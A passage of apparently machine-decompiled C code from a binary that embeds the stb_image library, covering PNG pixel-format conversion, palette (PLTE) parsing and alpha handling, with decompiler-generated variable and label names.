                              bVar39 = (byte)*puVar26;
                              puVar26 = (uint *)((longlong)puVar26 + 1);
                              *(byte *)((longlong)puVar45 + 3) = 0xff;
                              *(byte *)((longlong)puVar45 + 2) = bVar39;
                              *(ushort *)puVar45 = CONCAT11(bVar39,bVar39);
                              puVar45 = puVar45 + 1;
                            } while (-1 < (int)(((uVar7 - 1) + iVar12) - (int)puVar26));
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar26 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar45 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      default:
                        _assert(&DAT_14002b2bc,"stb_image.h",0x6fe);
LAB_140005238:
                        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
                        *puVar14 = "bad bits_per_channel";
                        return (uint *)0x0;
                      case 7:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            lVar52 = 0;
                            do {
                              *(byte *)((longlong)puVar26 + lVar52) =
                                   (byte)*(ushort *)((longlong)puVar45 + lVar52 * 2);
                              lVar52 = lVar52 + 1;
                            } while (-1 < (int)((uVar7 - 1) - (int)lVar52));
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 9:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = puVar23;
                        puVar26 = _Memory;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              bVar39 = (byte)*puVar26;
                              iVar12 = iVar12 + -1;
                              puVar26 = (uint *)((longlong)puVar26 + 2);
                              *(byte *)((longlong)puVar45 + 2) = bVar39;
                              *(ushort *)puVar45 = CONCAT11(bVar39,bVar39);
                              puVar45 = (uint *)((longlong)puVar45 + 3);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar26 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar45 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 10:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            lVar52 = 0;
                            do {
                              bVar39 = (byte)*(ushort *)((longlong)puVar45 + lVar52 * 2);
                              puVar26[lVar52] =
                                   CONCAT31(CONCAT21(CONCAT11(*(byte *)((longlong)puVar45 +
                                                                       lVar52 * 2 + 1),bVar39),
                                                     bVar39),bVar39);
                              lVar52 = lVar52 + 1;
                            } while (-1 < (int)((uVar7 - 1) - (int)lVar52));
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 0xf:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            puVar46 = puVar26;
                            do {
                              puVar47 = (uint *)((longlong)puVar46 + 1);
                              *(byte *)puVar46 =
                                   (byte)((uint)(byte)*puVar45 * 0x4d +
                                          (uint)*(byte *)((longlong)puVar45 + 1) * 0x96 +
                                          (uint)*(byte *)((longlong)puVar45 + 2) * 0x1d >> 8);
                              puVar45 = (uint *)((longlong)puVar45 + 3);
                              puVar46 = puVar47;
                            } while (-1 < (int)(((uVar7 - 1) + (int)puVar26) - (int)puVar47));
                          }
                          uVar42 = uVar42 + 1;
                          uVar8 = uVar8 + iVar11;
                          uVar28 = uVar28 + iVar13;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 0x10:
                        uVar42 = 0;
                        uVar28 = 0;
                        uVar8 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *(byte *)puVar26 =
                                   (byte)((uint)(byte)*puVar45 * 0x4d +
                                          (uint)*(byte *)((longlong)puVar45 + 1) * 0x96 +
                                          (uint)*(byte *)((longlong)puVar45 + 2) * 0x1d >> 8);
                              *(byte *)((longlong)puVar26 + 1) = 0xff;
                              puVar45 = (uint *)((longlong)puVar45 + 3);
                              puVar26 = (uint *)((longlong)puVar26 + 2);
                            } while (iVar12 != -1);
                          }
                          uVar8 = uVar8 + 1;
                          uVar28 = uVar28 + iVar11;
                          uVar42 = uVar42 + iVar13;
                          if (uVar27 == uVar8) break;
                          puVar45 = (uint *)((ulonglong)uVar28 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar42 + (longlong)puVar23);
                        }
                        break;
                      case 0x12:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = puVar23;
                        puVar26 = _Memory;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              uVar38 = *puVar26;
                              iVar12 = iVar12 + -1;
                              *(byte *)((longlong)puVar45 + 3) = 0xff;
                              *(ushort *)puVar45 = (ushort)uVar38;
                              *(byte *)((longlong)puVar45 + 2) = *(byte *)((longlong)puVar26 + 2);
                              puVar45 = puVar45 + 1;
                              puVar26 = (uint *)((longlong)puVar26 + 3);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar26 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar45 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 0x17:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            puVar46 = puVar26;
                            do {
                              puVar47 = (uint *)((longlong)puVar46 + 1);
                              *(byte *)puVar46 =
                                   (byte)((uint)(byte)*puVar45 * 0x4d +
                                          (uint)*(byte *)((longlong)puVar45 + 1) * 0x96 +
                                          (uint)*(byte *)((longlong)puVar45 + 2) * 0x1d >> 8);
                              puVar45 = puVar45 + 1;
                              puVar46 = puVar47;
                            } while (-1 < (int)(((uVar7 - 1) + (int)puVar26) - (int)puVar47));
                          }
                          uVar42 = uVar42 + 1;
                          uVar8 = uVar8 + iVar11;
                          uVar28 = uVar28 + iVar13;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 0x18:
                        uVar42 = 0;
                        uVar28 = 0;
                        uVar8 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *(byte *)puVar26 =
                                   (byte)((uint)(byte)*puVar45 * 0x4d +
                                          (uint)*(byte *)((longlong)puVar45 + 1) * 0x96 +
                                          (uint)*(byte *)((longlong)puVar45 + 2) * 0x1d >> 8);
                              *(byte *)((longlong)puVar26 + 1) = *(byte *)((longlong)puVar45 + 3);
                              puVar45 = puVar45 + 1;
                              puVar26 = (uint *)((longlong)puVar26 + 2);
                            } while (iVar12 != -1);
                          }
                          uVar8 = uVar8 + 1;
                          uVar28 = uVar28 + iVar11;
                          uVar42 = uVar42 + iVar13;
                          if (uVar27 == uVar8) break;
                          puVar45 = (uint *)((ulonglong)uVar28 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar42 + (longlong)puVar23);
                        }
                        break;
                      case 0x19:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *(ushort *)puVar26 = (ushort)*puVar45;
                              *(byte *)((longlong)puVar26 + 2) = *(byte *)((longlong)puVar45 + 2);
                              puVar45 = puVar45 + 1;
                              puVar26 = (uint *)((longlong)puVar26 + 3);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                      }
                    }
                    free(_Memory);
                    puVar18[3] = uVar9;
                  }
                  else {
                    puVar23 = (uint *)malloc((ulonglong)(uVar27 * uVar7 * uVar9 * 2));
                    if (puVar23 == (uint *)0x0) {
LAB_140005855:
                      free(_Memory);
                      puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
                      *puVar14 = "outofmem";
                      puVar18[3] = uVar9;
                      return (uint *)0x0;
                    }
                    if (0 < (int)uVar27) {
                      iVar11 = uVar42 * uVar7;
                      iVar13 = uVar9 * uVar7;
                      switch((uVar9 - 10) + uVar42 * 8) {
                      case 0:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar26 = puVar23;
                        puVar45 = _Memory;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            lVar52 = 0;
                            do {
                              *(ushort *)(puVar26 + lVar52) =
                                   *(ushort *)((longlong)puVar45 + lVar52 * 2);
                              pbVar41 = (byte *)((longlong)puVar26 + lVar52 * 4 + 2);
                              pbVar41[0] = 0xff;
                              pbVar41[1] = 0xff;
                              lVar52 = lVar52 + 1;
                            } while (-1 < (int)((uVar7 - 1) - (int)lVar52));
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar42 == uVar27) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 1:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar26 = puVar23;
                        puVar45 = _Memory;
                        auVar55 = extraout_XMM0;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              uVar38 = *puVar45;
                              iVar12 = iVar12 + -1;
                              puVar45 = (uint *)((longlong)puVar45 + 2);
                              *(ushort *)(puVar26 + 1) = (ushort)uVar38;
                              auVar55 = pshuflw(auVar55,ZEXT216((ushort)uVar38),0);
                              *puVar26 = auVar55._0_4_;
                              puVar26 = (uint *)((longlong)puVar26 + 6);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar42 == uVar27) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 2:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar26 = puVar23;
                        puVar45 = _Memory;
                        auVar55 = extraout_XMM0;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              uVar38 = *puVar45;
                              iVar12 = iVar12 + -1;
                              puVar45 = (uint *)((longlong)puVar45 + 2);
                              *(ushort *)(puVar26 + 1) = (ushort)uVar38;
                              auVar55 = pshuflw(auVar55,ZEXT216((ushort)uVar38),0);
                              *(ushort *)((longlong)puVar26 + 6) = 0xffff;
                              *puVar26 = auVar55._0_4_;
                              puVar26 = puVar26 + 2;
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar42 == uVar27) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      default:
                        _assert(&DAT_14002b2bc,"stb_image.h",0x737);
                        goto LAB_1400050f8;
                      case 7:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            lVar52 = 0;
                            do {
                              *(ushort *)((longlong)puVar26 + lVar52 * 2) = (ushort)puVar45[lVar52];
                              lVar52 = lVar52 + 1;
                            } while (-1 < (int)((uVar7 - 1) - (int)lVar52));
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 9:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar26 = puVar23;
                        puVar45 = _Memory;
                        auVar55 = extraout_XMM0;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              uVar38 = *puVar45;
                              iVar12 = iVar12 + -1;
                              puVar45 = puVar45 + 1;
                              *(ushort *)(puVar26 + 1) = (ushort)uVar38;
                              auVar55 = pshuflw(auVar55,ZEXT216((ushort)uVar38),0);
                              *puVar26 = auVar55._0_4_;
                              puVar26 = (uint *)((longlong)puVar26 + 6);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar42 == uVar27) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 10:
                        uVar30 = 1;
                        if (SCARRY4(uVar7 - 2,1) == (int)(uVar7 - 1) < 0) {
                          uVar30 = (ulonglong)uVar7;
                        }
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar26 = puVar23;
                        puVar45 = _Memory;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            lVar52 = 0;
                            do {
                              in_XMM1 = pshuflw(in_XMM1,ZEXT416(*(uint *)((longlong)puVar45 + lVar52
                                                                         )),0xe0);
                              *(uint *)((longlong)puVar26 + lVar52 * 2 + 4) =
                                   *(uint *)((longlong)puVar45 + lVar52);
                              *(int *)((longlong)puVar26 + lVar52 * 2) = in_XMM1._0_4_;
                              lVar52 = lVar52 + 4;
                            } while (lVar52 != uVar30 * 4);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 0xf:
                        uVar8 = 0;
                        uVar42 = 0;
                        iVar12 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar49 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar49 = iVar49 + -1;
                              *(ushort *)puVar26 =
                                   (ushort)((uint)(ushort)*puVar45 * 0x4d +
                                            (uint)*(ushort *)((longlong)puVar45 + 2) * 0x96 +
                                            (uint)(ushort)puVar45[1] * 0x1d >> 8);
                              puVar45 = (uint *)((longlong)puVar45 + 6);
                              puVar26 = (uint *)((longlong)puVar26 + 2);
                            } while (iVar49 != -1);
                          }
                          if (iVar12 + 1U == uVar27) break;
                          uVar8 = uVar8 + iVar13;
                          uVar42 = uVar42 + iVar11;
                          iVar12 = iVar12 + 1;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar42 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar8 * 2);
                        }
                        break;
                      case 0x10:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *(ushort *)puVar26 =
                                   (ushort)((uint)(ushort)*puVar45 * 0x4d +
                                            (uint)*(ushort *)((longlong)puVar45 + 2) * 0x96 +
                                            (uint)(ushort)puVar45[1] * 0x1d >> 8);
                              *(ushort *)((longlong)puVar26 + 2) = 0xffff;
                              puVar45 = (uint *)((longlong)puVar45 + 6);
                              puVar26 = puVar26 + 1;
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar8 = uVar8 + iVar11;
                          uVar28 = uVar28 + iVar13;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 0x12:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar26 = puVar23;
                        puVar45 = _Memory;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *puVar26 = *puVar45;
                              *(ushort *)(puVar26 + 1) = (ushort)puVar45[1];
                              *(ushort *)((longlong)puVar26 + 6) = 0xffff;
                              puVar26 = puVar26 + 2;
                              puVar45 = (uint *)((longlong)puVar45 + 6);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar42 == uVar27) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 0x17:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *(ushort *)puVar26 =
                                   (ushort)((uint)(ushort)*puVar45 * 0x4d +
                                            (uint)*(ushort *)((longlong)puVar45 + 2) * 0x96 +
                                            (uint)(ushort)puVar45[1] * 0x1d >> 8);
                              puVar45 = puVar45 + 2;
                              puVar26 = (uint *)((longlong)puVar26 + 2);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar8 = uVar8 + iVar11;
                          uVar28 = uVar28 + iVar13;
                          if (uVar42 == uVar27) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                        break;
                      case 0x18:
                        uVar8 = 0;
                        uVar42 = 0;
                        iVar12 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar49 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar49 = iVar49 + -1;
                              *puVar26 = (uint)*(ushort *)((longlong)puVar45 + 6) << 0x10 |
                                         (int)((uint)(ushort)*puVar45 * 0x4d +
                                               (uint)*(ushort *)((longlong)puVar45 + 2) * 0x96 +
                                              (uint)(ushort)puVar45[1] * 0x1d) >> 8 & 0xffffU;
                              puVar45 = puVar45 + 2;
                              puVar26 = puVar26 + 1;
                            } while (iVar49 != -1);
                          }
                          if (uVar27 == iVar12 + 1U) break;
                          iVar12 = iVar12 + 1;
                          uVar42 = uVar42 + iVar11;
                          uVar8 = uVar8 + iVar13;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar42 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar8 * 2);
                        }
                        break;
                      case 0x19:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          iVar12 = uVar7 - 1;
                          if (-1 < (int)(uVar7 - 1)) {
                            do {
                              iVar12 = iVar12 + -1;
                              *puVar26 = *puVar45;
                              *(ushort *)(puVar26 + 1) = (ushort)puVar45[1];
                              puVar45 = puVar45 + 2;
                              puVar26 = (uint *)((longlong)puVar26 + 6);
                            } while (iVar12 != -1);
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((longlong)_Memory + (ulonglong)uVar8 * 2);
                          puVar26 = (uint *)((longlong)puVar23 + (ulonglong)uVar28 * 2);
                        }
                      }
                    }
                    free(_Memory);
                    puVar18[3] = uVar9;
                  }
                }
                *(uint *)pcVar33 = *puVar18;
                *puVar44 = puVar18[1];
                if (puVar48 != (uint *)0x0) {
                  *puVar48 = puVar18[2];
                }
                puVar44 = (uint *)0x0;
              }
              free(puVar44);
              free(pvStackY_690);
              free(pvStackY_698);
              return puVar23;
            }
            if (bVar2) {
LAB_140004a2e:
              uStackY_630 = 0x140004a3f;
              puVar18 = (uint *)FUN_1400092f0((size_t *)&DAT_14000b0c0);
              _Size = (ulonglong)*puVar18;
              uVar42 = DAT_14002f030;
              if (*puVar18 != 0) {
                uStackY_630 = 0x140004a5f;
                puVar18 = (uint *)FUN_1400092f0((size_t *)&DAT_14000b0a0);
                puVar48 = (uint *)(ulonglong)*puVar18;
                uVar42 = *puVar18;
              }
              if ((uVar42 != 0) && (2 < (int)puVar44[3])) {
                piVar21 = (int *)*param_1;
                pbVar41 = (byte *)param_1[3];
                uVar42 = *piVar21 * piVar21[1];
                puVar18 = (uint *)(ulonglong)uVar42;
                if (piVar21[3] == 3) {
                  if (uVar42 != 0) {
                    pbVar25 = pbVar41;
                    do {
                      bVar39 = *pbVar25;
                      pbVar37 = pbVar25 + 3;
                      *pbVar25 = pbVar25[2];
                      pbVar25[2] = bVar39;
                      pbVar25 = pbVar37;
                    } while (pbVar37 != pbVar41 + (longlong)puVar18 * 3);
                  }
                }
                else {
                  if (piVar21[3] != 4) {
                    uStackY_630 = 0x140004eb9;
                    _assert("s->img_out_n == 4","stb_image.h",0x13b7);
                    goto LAB_140004eb9;
                  }
                  uStackY_630 = 0x140004d3a;
                  piVar21 = (int *)FUN_1400092f0((size_t *)&DAT_14000b080);
                  iVar11 = DAT_14002f034;
                  if (*piVar21 != 0) {
                    uStackY_630 = 0x140004d55;
                    piVar21 = (int *)FUN_1400092f0((size_t *)&DAT_14000b060);
                    iVar11 = *piVar21;
                  }
                  if (iVar11 == 0) {
                    pbVar25 = pbVar41;
                    if (uVar42 != 0) {
                      do {
                        bVar39 = *pbVar25;
                        pbVar37 = pbVar25 + 4;
                        *pbVar25 = pbVar25[2];
                        pbVar25[2] = bVar39;
                        pbVar25 = pbVar37;
                      } while (pbVar41 + (longlong)puVar18 * 4 != pbVar37);
                    }
                  }
                  else if (uVar42 != 0) {
                    pbVar25 = pbVar41;
                    do {
                      bVar39 = pbVar25[3];
                      bVar6 = *pbVar25;
                      bVar5 = pbVar25[2];
                      if (bVar39 != 0) {
                        uVar42 = (uint)bVar39;
                        bVar39 = bVar39 >> 1;
                        bVar5 = (byte)((int)(((uint)bVar5 * 0x100 - (uint)bVar5) + (uint)bVar39) /
                                      (int)uVar42);
                        pbVar25[1] = (byte)((int)(((uint)pbVar25[1] * 0x100 - (uint)pbVar25[1]) +
                                                 (uint)bVar39) / (int)uVar42);
                        bVar6 = (byte)((int)(((uint)bVar6 * 0x100 - (uint)bVar6) + (uint)bVar39) /
                                      (int)uVar42);
                      }
                      pbVar25[2] = bVar6;
                      pbVar37 = pbVar25 + 4;
                      *pbVar25 = bVar5;
                      pbVar25 = pbVar37;
                    } while (pbVar41 + (longlong)puVar18 * 4 != pbVar37);
                  }
                }
              }
              if (local_5c2 == 0) {
                if (local_5c1 == 0) goto LAB_140004392;
LAB_140004a92:
                puVar44[2] = puVar44[2] + 1;
                goto LAB_140004392;
              }
            }
            else if (local_5c2 == 0) goto LAB_140004392;
LAB_14000478b:
            puVar44[2] = (uint)local_5c2;
            uVar42 = (uint)local_5c2;
            if (2 < (int)param_3) {
              uVar42 = param_3;
            }
            puVar44[3] = uVar42;
            uVar27 = *(int *)*param_1 * ((int *)*param_1)[1];
            if ((-1 < (int)uVar27) && ((int)uVar27 <= (int)(0x7fffffff / (longlong)(int)uVar42))) {
              pbVar41 = (byte *)param_1[3];
              uStackY_630 = 0x1400047e7;
              puVar17 = (undefined2 *)malloc((longlong)(int)(uVar42 * uVar27));
              if (puVar17 != (undefined2 *)0x0) {
                if (uVar42 == 3) {
                  if (uVar27 != 0) {
                    pbVar25 = pbVar41;
                    puVar31 = puVar17;
                    do {
                      bVar39 = *pbVar25;
                      pbVar25 = pbVar25 + 1;
                      uVar4 = *(undefined1 *)
                               ((longlong)&local_4c8 + (longlong)(int)((uint)bVar39 << 2) + 2);
                      *puVar31 = *(undefined2 *)
                                  ((longlong)&local_4c8 + (longlong)(int)((uint)bVar39 << 2));
                      *(undefined1 *)(puVar31 + 1) = uVar4;
                      puVar31 = (undefined2 *)((longlong)puVar31 + 3);
                    } while (pbVar25 != pbVar41 + uVar27);
                  }
                }
                else {
                  uVar30 = 0;
                  if (uVar27 != 0) {
                    do {
                      *(undefined4 *)(puVar17 + uVar30 * 2) =
                           *(undefined4 *)
                            ((longlong)&local_4c8 + (longlong)(int)((uint)pbVar41[uVar30] << 2));
                      uVar30 = uVar30 + 1;
                    } while (uVar30 != uVar27);
                  }
                }
                uStackY_630 = 0x140004389;
                free(pbVar41);
                param_1[3] = (longlong)puVar17;
LAB_140004392:
                uStackY_630 = 0x1400043a0;
                free((void *)param_1[2]);
                param_1[2] = 0;
                uStackY_630 = 0x1400043b2;
                stbi_defilter_row((longlong)puVar44);
                return (uint *)0x1;
              }
            }
LAB_140004ad9:
            uStackY_630 = 0x140004aec;
            puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar14 = "outofmem";
            return (uint *)0x0;
          }
          if (uVar8 != 0x43674249) goto LAB_140003c10;
          uStackY_630 = 0x140003b25;
          stbi_compute_huffman_codes((longlong)puVar44,uVar7);
          bVar2 = true;
        }
      }
      else if (uVar8 == 0x504c5445) {
        if (iVar11 != 0) goto LAB_1400045a8;
        if (0x300 < uVar7) {
LAB_140004af4:
          uStackY_630 = 0x140004b07;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "invalid PLTE";
          return (uint *)0x0;
        }
        uVar43 = _Size / 3;
        uVar8 = (uVar7 / 3) * 3;
        if (uVar8 != uVar7) goto LAB_140004af4;
        uVar9 = 0;
        puVar40 = &local_4c8;
        if (uVar8 < 3) {
          uVar43 = 0;
        }
        else {
          do {
            puVar29 = *(undefined1 **)(puVar44 + 0x30);
            puVar15 = *(undefined1 **)(puVar44 + 0x32);
            if (puVar29 < puVar15) {
              puVar24 = puVar29 + 1;
              *(undefined1 **)(puVar44 + 0x30) = puVar24;
              uVar4 = *puVar29;
LAB_140003ce2:
              *(undefined1 *)puVar40 = uVar4;
              if (puVar15 <= puVar24) goto LAB_140003c90;
              puVar29 = puVar24 + 1;
              *(undefined1 **)(puVar44 + 0x30) = puVar29;
              uVar4 = *puVar24;
LAB_140003cf7:
              *(undefined1 *)((longlong)puVar40 + 1) = uVar4;
              if (puVar15 <= puVar29) goto LAB_140003ca1;
              *(undefined1 **)(puVar44 + 0x30) = puVar29 + 1;
              uVar4 = *puVar29;
            }
            else {
              if (puVar44[0xc] != 0) {
                uStackY_630 = 0x140003d68;
                FUN_140001480((longlong)puVar44);
                puVar29 = *(undefined1 **)(puVar44 + 0x30);
                puVar24 = puVar29 + 1;
                *(undefined1 **)(puVar44 + 0x30) = puVar24;
                uVar4 = *puVar29;
                puVar15 = *(undefined1 **)(puVar44 + 0x32);
                goto LAB_140003ce2;
              }
              *(undefined1 *)puVar40 = 0;
LAB_140003c90:
              if (puVar44[0xc] != 0) {
                uStackY_630 = 0x140003d40;
                FUN_140001480((longlong)puVar44);
                puVar15 = *(undefined1 **)(puVar44 + 0x30);
                puVar29 = puVar15 + 1;
                *(undefined1 **)(puVar44 + 0x30) = puVar29;
                uVar4 = *puVar15;
                puVar15 = *(undefined1 **)(puVar44 + 0x32);
                goto LAB_140003cf7;
              }
              *(undefined1 *)((longlong)puVar40 + 1) = 0;
LAB_140003ca1:
